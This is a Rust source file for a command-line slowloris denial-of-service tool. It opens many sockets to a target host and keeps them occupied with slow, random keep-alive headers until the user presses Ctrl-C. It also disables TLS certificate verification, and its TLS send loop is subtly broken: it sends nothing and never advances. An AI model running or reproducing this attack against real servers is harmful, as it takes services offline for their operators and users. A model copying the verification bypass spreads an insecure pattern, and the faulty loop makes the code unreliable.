use std::{
    env,
    io::Write,
    net::{TcpStream, ToSocketAddrs},
    process,
    sync::{
        mpsc::{channel, Receiver},
        Arc,
    },
    time::SystemTime,
};

use log::{debug, error, info};
use rand::Rng;
use rustls::{
    client::{ServerCertVerified, ServerCertVerifier},
    Certificate, ClientConfig, ClientConnection, ServerName,
};
use spinners::{Spinner, Spinners};

pub fn slowloris(c: &seahorse::Context) {
    if c.bool_flag("verbose") {
        env::set_var("RUST_LOG", "DEBUG");
    } else {
        env::set_var("RUST_LOG", "INFO");
    }
    env_logger::init();

    if c.args.is_empty() {
        error!("Please provide a url");
        return;
    }
    let is_http_only = c.bool_flag("httponly");
    let port = c
        .int_flag("port")
        .unwrap_or_else(|_| if is_http_only { 80 } else { 443 });
    let url = format!("{}:{}", c.args[0].clone(), port);

    let sock_cnt = c.int_flag("socket").unwrap_or(1000);
    let rx = ctrlc_handler();

    info!("Starting slowloris attack on {}", url);
    info!("If you want to stop the attack, \x1b[31mpress Ctrl-C\x1b[m \x1b[36m\x1b[m");
    execute(url, sock_cnt as usize, rx, is_http_only);
    println!();
    info!("\x1b[32mДо свидания:)\x1b[m \x1b[35m\x1b[m");
}

fn execute<P: ToSocketAddrs>(
    ip: P,
    sock_cnt: usize,
    rx: std::sync::mpsc::Receiver<()>,
    is_http_only: bool,
) {
    let mut sock_list = Vec::new();
    info!(
        "Creating {} sockets... \x1b[36mIt takes some minutes.\x1b[0m",
        sock_cnt
    );
    for s in 0..sock_cnt {
        if rx.try_recv().is_ok() {
            return;
        }
        match init_socket(&ip) {
            Ok(sock) => {
                sock_list.push(sock);
            }
            Err(e) => {
                debug!("Socket {} failed: {}", s, e);
            }
        }
    }
    // it is a super-kawaii spinner.
    let mut sp = Spinner::new(
        Spinners::BoxBounce2,
        "\x1b[31mAttacking... В действии...\x1b[m \x1b[36m\x1b[m".into(),
    );
    let mut rng = rand::thread_rng();
    info!(
        "\x1b[33mOk. Готово.\x1b[0m Starting Attack with socket: {}",
        sock_list.len()
    );
    loop {
        // Check if the user wants to stop the attack
        if rx.try_recv().is_ok() {
            break;
        }
        debug!(
            "Sending keep-alive headers... socket count: {}",
            sock_list.len()
        );
        let mut i = 0;
        // create TLS connection
        let tls_config = init_tls();
        let arc_config = Arc::new(tls_config);
        let socket_addr = ip
            .to_socket_addrs()
            .unwrap()
            .next()
            .expect("Failed to get socket address");
        let mut tls_client =
            ClientConnection::new(arc_config, ServerName::IpAddress(socket_addr.ip()))
                .expect("Failed to create TLS client");

        // Send keep-alive headers
        while i < sock_list.len() {
            if rx.try_recv().is_ok() {
                return;
            }
            let msg = format!("X-a: {}\r", rng.gen::<u32>());
            if is_http_only {
                if let Err(e) = sock_list[i].write_all(msg.as_bytes()) {
                    debug!("Socket failed. Removing...: {}", e);
                    sock_list.remove(i);
                } else {
                    i += 1;
                }
                continue;
            }
            let sock = sock_list.get_mut(i).unwrap();
        }
        // Add new sockets if the list is not full
        for i in sock_list.len()..sock_cnt {
            if rx.try_recv().is_ok() {
                return;
            }
            match init_socket(&ip) {
                Ok(sock) => {
                    sock_list.push(sock);
                }
                Err(e) => {
                    debug!("Socket {} failed: {}", i, e);
                }
            }
        }
    }
    // at last kawaii spinner is stopped.
    sp.stop();
}

// forgo TLS certificate verification
struct NoCertificateVerification {}
impl ServerCertVerifier for NoCertificateVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &Certificate,
        _intermediates: &[Certificate],
        _server_name: &ServerName,
        _scts: &mut dyn Iterator<Item = &[u8]>,
        _ocsp_response: &[u8],
        _now: SystemTime,
    ) -> Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }
}

// initialize a socket
fn init_socket<P: ToSocketAddrs>(to: P) -> Result<TcpStream, std::io::Error> {
    TcpStream::connect(to)
}

// initialize TLS configuration
fn init_tls() -> ClientConfig {
    let root_certs = rustls::RootCertStore::empty();
    let mut config = rustls::ClientConfig::builder()
        .with_safe_defaults()
        .with_root_certificates(root_certs)
        .with_no_client_auth();
    config
        .dangerous()
        .set_certificate_verifier(Arc::new(NoCertificateVerification {}));
    config
}

// return a Ctrl-C signal receiver
fn ctrlc_handler() -> Receiver<()> {
    let (tx, rx) = channel();
    if let Err(e) =
        ctrlc::set_handler(move || tx.send(()).expect("Could not send signal on channel."))
    {
        error!("Error setting Ctrl-C handler: {}", e);
        process::exit(1);
    };
    rx
}
